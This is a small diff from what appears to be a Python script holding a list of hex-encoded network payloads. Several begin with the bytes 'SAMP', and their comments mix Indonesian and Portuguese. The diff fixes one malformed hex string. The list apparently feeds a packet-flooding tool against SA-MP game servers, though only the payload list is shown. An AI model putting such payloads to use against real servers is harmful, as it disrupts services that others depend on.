@@ -18,7 +18,7 @@ payloads = [
     codecs.decode("021efd40", "hex_codec"),                        # cookie port 1111
     codecs.decode("081e7eda", "hex_codec"),                        # cookie port 1111 tambem
     codecs.decode("53414d50a3b17dd3311e8c", "hex_codec"),          # payload tambahan
-    codecs.decode("53414d5098e1a96c11e63", "hex_codec"),          # payload tambahan
+    codecs.decode("053414d5098e1a96c11e63", "hex_codec"),          # payload tambahan
     codecs.decode("53414d509538e1a9611e6f", "hex_codec"),          # payload tambahan
     # Tambahkan lebih banyak payloads di sini jika diperlukan
 ]
